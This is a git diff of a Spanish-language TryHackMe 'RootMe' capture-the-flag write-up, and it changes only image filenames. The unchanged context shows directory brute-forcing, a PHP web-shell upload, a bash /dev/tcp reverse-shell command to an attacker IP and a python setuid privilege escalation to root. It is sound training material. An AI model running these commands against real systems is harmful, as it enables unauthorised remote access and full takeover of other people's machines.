@@ -1,5 +1,5 @@
 # RootMe - TryHackMe Writeup
-![RootMe Room](rootme.png.png)
+![RootMe Room](rootme.png)
 ## Introducción
 
 Este writeup documenta el proceso de compromiso de la máquina **RootMe** en TryHackMe.
@@ -37,14 +37,14 @@ Dado que el servicio HTTP se encuentra disponible, se procedió a realizar una e
 ```bash
 gobuster dir -u http://10.128.172.51 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
-![Gobuster](2.png)
+![Gobuster](Gobuster1.png)
 
 Posteriormente, se realizó una enumeración más específica incluyendo extensiones comunes como **.php**, **.txt** y **.html**, con el objetivo de identificar archivos potencialmente sensibles en el servidor.
 
 ```bash
 gobuster dir -u http://10.128.172.51 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php,txt,html
 ```
-![Gobuster](3.png)
+![Gobuster](Gobuster2.png)
 
 Este segundo escaneo permitió identificar archivos adicionales como **index.php**, así como confirmar la existencia de directorios previamente descubiertos como **/panel** y **/uploads**.
 
@@ -66,7 +66,7 @@ Una vez identificado el directorio `/panel`, se accedió a la funcionalidad de c
 
 El formulario permitía seleccionar y subir archivos al servidor, por lo que se evaluó si esta funcionalidad podía ser utilizada para obtener ejecución remota de código.
 
-![Upload Panel](5.png)
+![Upload Panel](Panel.png)
 
 Como se puede observar, el panel permite la carga de archivos directamente al servidor.
 
@@ -82,7 +82,7 @@ Se logró subir archivos con extensión **.txt** y **.php5**, los cuales fueron 
 
 A continuación, se muestra el contenido del directorio accesible desde el navegador:
 
-![Uploads Directory](6.png)
+![Uploads Directory](Uploads.png)
 
 El hecho de que los archivos subidos sean accesibles desde el navegador indica que el servidor permite servir directamente el contenido del directorio `/uploads`.
 
@@ -90,7 +90,7 @@ Esto indica que, si se logra subir un archivo ejecutable por el servidor (como u
 
 Para comprobar el comportamiento del servidor, se accedió directamente a uno de los archivos subidos.
 
-![Accesing Uploaded File](8.png)
+![Accesing Uploaded File](Filetxt.png)
 
 Como se puede observar, el contenido del archivo **diego.txt** es mostrado directamente en el navegador.
 
@@ -109,11 +109,11 @@ El payload utilizado permite ejecutar comandos del sistema a través de parámet
 Este tipo de payload es ampliamente utilizado en pruebas de seguridad para obtener ejecución remota de comandos (RCE). Referencias como [PentestMonkey - PHP Reverse Shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 sirvieron como guía para la construcción del payload.
 
-![Web Shell Creation](9.png)
+![Web Shell Creation](CreateShell.png)
 
 Una vez subido el archivo, se accedió al mismo desde el navegador utilizando el parámetro `cmd` para ejecutar comandos del sistema.
 
-![Command Execution](10.png)
+![Command Execution](CommandExec.png)
 
 Como se puede observar, el servidor ejecuta el comando `id`, devolviendo información del usuario bajo el cual se ejecuta el servicio web (**www-data**).
 
@@ -136,7 +136,7 @@ http://10.128.172.51/uploads/shell.php5?cmd=bash -c 'bash -i >& /dev/tcp/10.128.
 ```
 Este tipo de payload es ampliamente utilizado en pruebas de penetración y puede encontrarse en recursos como [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet).
 
-![Reverse Shell Execution](15.png)
+![Reverse Shell Execution](RShell.png)
 
 Este comando instruye al servidor a iniciar una conexión hacia la máquina atacante en el puerto 4444, proporcionando una shell interactiva.
 
@@ -144,7 +144,7 @@ Al ejecutarse correctamente, se obtiene acceso remoto al sistema comprometido de
 
 Una vez ejecutado el payload, se recibió una conexión entrante en el listener configurado previamente:
 
-![Reverse Shell Connection](16.png)
+![Reverse Shell Connection](RShellConnect.png)
 
 Como se puede observar, se establece una conexión desde la máquina víctima hacia la máquina atacante, obteniendo una shell como el usuario **www-data**.
 
@@ -162,7 +162,7 @@ Para ello, se buscaron archivos con permisos SUID en el sistema.
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
-![SUID Files](22.png)
+![SUID Files](SUID.png)
 
 Este comando permite identificar archivos con el bit SUID activado, lo que implica que se ejecutan con los privilegios del propietario del archivo.
 
@@ -177,7 +177,7 @@ python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 Este método se basa en técnicas documentadas en recursos como [GTFOBins](https://gtfobins.github.io/gtfobins/python/), donde se detallan formas de explotar binarios con permisos elevados.
 
-![Privilege Escalation to Root](25.png)
+![Privilege Escalation to Root](PrivEsc.png)
 
 Como resultado, se obtiene una shell con privilegios de **root**, lo cual se verifica mediante los comandos `whoami` e `id`.
 
@@ -191,7 +191,7 @@ ls
 cat root.txt
 ```
 
-![Root Flag](28.png)
+![Root Flag](RootFlag.png)
 
 
 ## Conclusión
